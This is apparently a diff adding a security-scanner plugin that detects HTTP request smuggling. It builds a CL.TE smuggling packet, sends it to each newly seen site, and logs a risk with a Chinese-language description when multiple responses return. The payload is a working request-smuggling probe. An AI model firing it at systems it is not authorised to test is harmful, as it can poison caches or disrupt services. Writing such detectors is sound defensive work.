@@ -1,0 +1,46 @@
+templatePacket = "GET / HTTP/1.1\r\n" +
+"Host: REPLACEME_HOST\r\n" +
+"Content-Length: REPLACEME_PACKET_LENGTH\r\n" +
+"Transfer-Encoding: chunked\r\n\r\n" +
+x`1{{hexd(0d0a)}}a{{hexd(0d0a)}}0{{hexd(0d0a)}}{{hexd(0d0a)}}`[0]
+
+vulInfo = `HTTP 请求走私（HTTP Request Smuggling, 简称 HRS）是一种利用 HTTP 协议设计缺陷或者服务器配置错误的攻击手段。此攻击手段主要是通过发送特制的 HTTP 请求，使得前端和后端服务器对 HTTP 请求边界的解析产生分歧，从而达到插入恶意 HTTP 请求的目的。
+
+这种攻击方式可能会导致以下危害：
+
+绕过安全防护：一些防火墙和入侵检测系统可能无法正确识别被走私的 HTTP 请求，从而使攻击者能够绕过这些防护措施。
+
+进行缓存投毒：攻击者可以利用请求走私将恶意内容注入缓存服务器，使得其他用户访问时被提供恶意内容。
+
+劫持用户会话：攻击者可以通过请求走私来劫持用户的会话，获取敏感信息，甚至以用户的身份进行操作。
+
+拒绝服务攻击：攻击者可以通过发送大量的走私请求，导致服务器资源耗尽，从而实施拒绝服务攻击。
+
+HTTP 请求走私攻击的防护主要依赖于正确配置和更新 HTTP 服务器、代理服务器和负载均衡器，确保它们能够一致地解析 HTTP 请求。此外，定期进行安全审计和使用最新的安全防护软件也可以帮助防止此类攻击。`
+
+buildSmugglePacket = (host, newPacket) => {
+    packetLen = len(newPacket)
+    packetLen += 11
+    result = templatePacket.Replace(`REPLACEME_HOST`, host).Replace(`REPLACEME_PACKET_LENGTH`, f`${packetLen}`)
+    return result + string(newPacket)
+}
+# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
+mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    host := "Host:" in req ? poc.GetHTTPPacketHeader(req, "Host") : poc.GetHTTPPacketHeader(req, "host")
+    payload = buildSmugglePacket(host, req)
+    println(payload)
+    rsp, _ = poc.HTTPEx(payload, poc.https(isHttps), poc.noFixContentLength(true))~
+    if rsp.MultiResponse {
+        risk.NewRisk(
+            url,
+            risk.title(f"HTTP Smuggle Detected: ${host}"),
+            risk.titleVerbose(f"HTTP 请求走私：${host}"),
+            risk.request(payload),
+            risk.response(rsp.RawPacket),
+            risk.severity("middle"),
+            risk.type("http smuggle"),
+            risk.typeVerbose("HTTP请求走私"),
+            risk.description(vulInfo),
+        )
+    }
+}
